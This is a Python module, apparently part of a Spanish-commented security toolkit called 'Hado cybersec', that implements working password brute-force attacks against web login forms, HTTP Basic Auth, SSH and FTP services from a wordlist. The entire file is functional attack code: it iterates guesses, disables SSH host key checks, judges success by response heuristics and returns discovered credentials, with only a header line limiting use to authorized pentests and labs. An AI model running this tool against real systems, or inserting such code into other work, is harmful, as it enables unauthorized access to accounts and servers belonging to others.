"""
Hado cybersec — Modulo de ataques de fuerza bruta.
ADVERTENCIA: Solo para uso en entornos autorizados (pentesting, CTFs, labs propios).

Cadena de fallback para SSH:
  1. paramiko  — libreria Python nativa (pip install paramiko)
  2. sshpass   — binario de linea de comandos (brew install sshpass)
  3. socket    — intento raw TCP al puerto 22 (solo verifica si acepta conexion)

FTP: usa ftplib de la stdlib (siempre disponible).
HTTP: usa requests con soporte para Basic Auth, POST form, y GET.
"""

from typing import List, Optional, Dict, Any
import warnings
import time


def attack(service: str, target: str, wordlist, username: str = "admin") -> dict:
    """
    Ataque de fuerza bruta contra un servicio.

    Args:
        service: tipo de servicio ("http", "ssh", "ftp", "http-get", "http-post",
                 "http-basic")
        target: host/URL objetivo
        wordlist: lista de passwords O path a archivo de wordlist
        username: usuario a atacar (default: "admin")

    Returns:
        dict con claves:
          - success: bool — si encontro credenciales validas
          - credential: {"user": str, "password": str} | None
          - attempts: int — numero de intentos realizados
          - service: str — tipo de servicio atacado
          - target: str — objetivo
          - elapsed: float — tiempo total en segundos
          - method: str — metodo de ataque usado (paramiko/sshpass/requests/ftplib)
          - error: str | None — mensaje de error si hubo fallo total
    """
    passwords = _load_wordlist(wordlist)
    if not passwords:
        return _result(service, target, error="Wordlist vacia o no encontrada")

    start = time.time()

    if service in ("http", "http-post"):
        result = _brute_http_post(target, username, passwords)
    elif service == "http-get":
        result = _brute_http_get(target, username, passwords)
    elif service == "http-basic":
        result = _brute_http_basic(target, username, passwords)
    elif service == "ssh":
        result = _brute_ssh(target, username, passwords)
    elif service == "ftp":
        result = _brute_ftp(target, username, passwords)
    else:
        result = _result(
            service, target,
            error=f"Servicio '{service}' no soportado. Usa: http, http-get, "
                  "http-basic, http-post, ssh, ftp"
        )

    result["elapsed"] = round(time.time() - start, 3)
    result["service"] = service
    result["target"] = target
    return result


# ─── Wordlist loader ─────────────────────────────────────────────────────────

def _load_wordlist(wordlist) -> List[str]:
    """Carga passwords desde lista, archivo, o generador."""
    if isinstance(wordlist, list):
        return wordlist
    if isinstance(wordlist, str):
        try:
            with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            warnings.warn(
                f"Wordlist no encontrada: {wordlist}",
                RuntimeWarning, stacklevel=3,
            )
            return []
    try:
        return list(wordlist)
    except TypeError:
        return []


def _result(service: str = "", target: str = "", success: bool = False,
            credential: Optional[dict] = None, attempts: int = 0,
            method: str = "", error: Optional[str] = None) -> dict:
    return {
        "success": success,
        "credential": credential,
        "attempts": attempts,
        "service": service,
        "target": target,
        "elapsed": 0.0,
        "method": method,
        "error": error,
    }


# ─── HTTP: POST form ────────────────────────────────────────────────────────

def _brute_http_post(url: str, username: str, passwords: List[str]) -> dict:
    try:
        import requests
    except ImportError:
        return _result(error="requests no instalado. Ejecuta: pip install requests")

    for i, password in enumerate(passwords):
        try:
            resp = requests.post(
                url,
                data={"username": username, "password": password},
                timeout=5,
                allow_redirects=False,
            )
            # Heuristicas de exito: 302 redirect, 200 sin "invalid"/"error"/"wrong"
            body_lower = resp.text.lower()
            login_failed = any(w in body_lower for w in
                               ("invalid", "error", "wrong", "incorrect", "failed",
                                "denied", "bad credentials"))
            if resp.status_code in (200, 302, 303) and not login_failed:
                return _result(
                    success=True,
                    credential={"user": username, "password": password},
                    attempts=i + 1,
                    method="requests-post",
                )
        except Exception:
            continue

    return _result(attempts=len(passwords), method="requests-post")


# ─── HTTP: GET con params ────────────────────────────────────────────────────

def _brute_http_get(url: str, username: str, passwords: List[str]) -> dict:
    try:
        import requests
    except ImportError:
        return _result(error="requests no instalado. Ejecuta: pip install requests")

    for i, password in enumerate(passwords):
        try:
            resp = requests.get(
                url,
                params={"username": username, "password": password},
                timeout=5,
                allow_redirects=False,
            )
            body_lower = resp.text.lower()
            login_failed = any(w in body_lower for w in
                               ("invalid", "error", "wrong", "incorrect", "failed"))
            if resp.status_code in (200, 302) and not login_failed:
                return _result(
                    success=True,
                    credential={"user": username, "password": password},
                    attempts=i + 1,
                    method="requests-get",
                )
        except Exception:
            continue

    return _result(attempts=len(passwords), method="requests-get")


# ─── HTTP: Basic Auth ────────────────────────────────────────────────────────

def _brute_http_basic(url: str, username: str, passwords: List[str]) -> dict:
    try:
        import requests
    except ImportError:
        return _result(error="requests no instalado. Ejecuta: pip install requests")

    for i, password in enumerate(passwords):
        try:
            resp = requests.get(
                url,
                auth=(username, password),
                timeout=5,
            )
            if resp.status_code == 200:
                return _result(
                    success=True,
                    credential={"user": username, "password": password},
                    attempts=i + 1,
                    method="requests-basic-auth",
                )
            # 401 = sigue intentando, otro codigo = parar
            if resp.status_code != 401:
                break
        except Exception:
            continue

    return _result(attempts=len(passwords), method="requests-basic-auth")


# ─── SSH ─────────────────────────────────────────────────────────────────────

def _brute_ssh(host: str, username: str, passwords: List[str]) -> dict:
    # Nivel 1: paramiko
    try:
        return _brute_ssh_paramiko(host, username, passwords)
    except ImportError:
        pass

    # Nivel 2: sshpass + ssh via subprocess
    try:
        return _brute_ssh_sshpass(host, username, passwords)
    except FileNotFoundError:
        pass

    # Nivel 3: verificar que el puerto SSH esta abierto al menos
    return _brute_ssh_socket_probe(host, username, passwords)


def _brute_ssh_paramiko(host: str, username: str, passwords: List[str]) -> dict:
    import paramiko  # type: ignore — lanza ImportError si no esta

    for i, password in enumerate(passwords):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(
                host,
                username=username,
                password=password,
                timeout=5,
                look_for_keys=False,
                allow_agent=False,
            )
            client.close()
            return _result(
                success=True,
                credential={"user": username, "password": password},
                attempts=i + 1,
                method="paramiko",
            )
        except paramiko.AuthenticationException:
            continue
        except paramiko.ssh_exception.SSHException:
            # Connection reset, banner error, etc. — reintentar
            continue
        except (OSError, EOFError):
            # Host no alcanzable o conexion rota
            break
        finally:
            client.close()

    return _result(attempts=len(passwords), method="paramiko")


def _brute_ssh_sshpass(host: str, username: str, passwords: List[str]) -> dict:
    import subprocess
    import shutil

    sshpass_path = shutil.which("sshpass")
    if not sshpass_path:
        raise FileNotFoundError("sshpass no encontrado en PATH")

    for i, password in enumerate(passwords):
        try:
            result = subprocess.run(
                [
                    sshpass_path, "-p", password,
                    "ssh",
                    "-o", "StrictHostKeyChecking=no",
                    "-o", "ConnectTimeout=5",
                    "-o", "NumberOfPasswordPrompts=1",
                    f"{username}@{host}",
                    "echo", "HADO_AUTH_OK",
                ],
                capture_output=True,
                text=True,
                timeout=10,
            )
            if "HADO_AUTH_OK" in result.stdout:
                return _result(
                    success=True,
                    credential={"user": username, "password": password},
                    attempts=i + 1,
                    method="sshpass",
                )
        except (subprocess.TimeoutExpired, OSError):
            continue

    return _result(attempts=len(passwords), method="sshpass")


def _brute_ssh_socket_probe(host: str, username: str, passwords: List[str]) -> dict:
    """
    Ultimo fallback: solo verifica si el puerto SSH esta abierto.
    No puede hacer auth real sin paramiko ni sshpass.
    """
    import socket

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, 22))
        banner = sock.recv(256).decode("utf-8", errors="ignore").strip()
        sock.close()

        return _result(
            attempts=0,
            method="socket-probe",
            error=(
                f"Puerto 22 abierto en {host} (banner: {banner}). "
                "Para brute force real instala paramiko (pip install paramiko) "
                "o sshpass."
            ),
        )
    except (OSError, socket.timeout):
        return _result(
            attempts=0,
            method="socket-probe",
            error=f"Puerto SSH no accesible en {host}:22",
        )


# ─── FTP ─────────────────────────────────────────────────────────────────────

def _brute_ftp(host: str, username: str, passwords: List[str]) -> dict:
    import ftplib

    for i, password in enumerate(passwords):
        ftp = None
        try:
            ftp = ftplib.FTP(timeout=5)
            ftp.connect(host, 21)
            ftp.login(username, password)
            ftp.quit()
            return _result(
                success=True,
                credential={"user": username, "password": password},
                attempts=i + 1,
                method="ftplib",
            )
        except ftplib.error_perm:
            # 530 Login incorrect — sigue intentando
            continue
        except (OSError, EOFError, ftplib.error_reply):
            # Conexion rechazada, timeout, etc.
            break
        finally:
            if ftp:
                try:
                    ftp.close()
                except Exception:
                    pass

    return _result(attempts=len(passwords), method="ftplib")


# ─── Aliases para compatibilidad ─────────────────────────────────────────────

brute_force = attack
